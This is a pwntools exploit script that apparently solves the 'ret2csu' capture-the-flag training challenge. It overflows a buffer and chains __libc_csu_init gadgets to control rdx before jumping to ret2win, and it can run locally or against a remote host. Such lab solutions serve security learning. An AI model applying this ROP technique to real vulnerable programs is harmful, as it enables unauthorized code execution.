#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2csu')
# context.terminal = ['tmux', 'splitw', '-h']
context.terminal = ['tmux', 'new-window']

host = args.HOST or ''
port = int(args.PORT or 8080)

def local(argv=[], *a, **kw):
    return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(argv, *a, **kw)
    else:
        return local(argv, *a, **kw)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

if args.GEF:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-gef'], gdbscript='''
    ''')
    # pie breakpoint function+118

if args.PWNDBG:
    gdb.attach(io, gdb_args=['-q', '-ex', 'init-pwndbg'], gdbscript='''
    ''')
    # piebase 0x7f0

rop = ROP(exe)
RET_GADGET = rop.find_gadget(["ret"]).address
ARG = 0xdeadcafebabebeef
PUTS_PLT = exe.plt["puts"]
log.info("Puts plt: %#x" % PUTS_PLT)
INIT_ARRAY_START = 0x0000000000600e10
RET2WIN_ADDR = exe.sym.ret2win
POP_RDI = 0x00000000004008a3
CSU_GADGET_1 = exe.sym.__libc_csu_init + 90 # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CSU_GADGET_2 = exe.sym.__libc_csu_init + 64 # mov rdx,r15; mov rsi,r14; mov edi,r13d; call QWORD PTR [r12+rbx*8]; add rbx,0x1; cmp rbp,rbx; jne 0x400880
   
# io.sendline(cyclic(1024))
OFFSET = cyclic_find(0x6161616b)
payload = "A" * OFFSET
# We have control of rdx through __libc_csu_init, now we just need to set the correct addresses (rbx = 0, r12 = pointer to a function, r15 = arg -> rdx)

payload += p64(CSU_GADGET_1)
payload += p64(0) # rbx
payload += p64(1) # rbp (set up so cmp rbp,rbx returns zero and the jump is not taken)
payload += p64(INIT_ARRAY_START) # r12 (find a pointer to a function that doesn't change rbx, I found init_array_start in symtab section)
payload += "junkjunk" # r13 (If we needed to set the first argument, pass it here)
payload += "junkjunk" # r14 (If we needed to set the second argument, pass it here)
payload += p64(ARG) # r15 (Third argument)

payload += p64(CSU_GADGET_2)
payload += "junkjunk" * 7 # re-pop the registers with junk, we don't care since we only need rdx
payload += p64(RET2WIN_ADDR)

io.sendline(payload)

io.interactive()

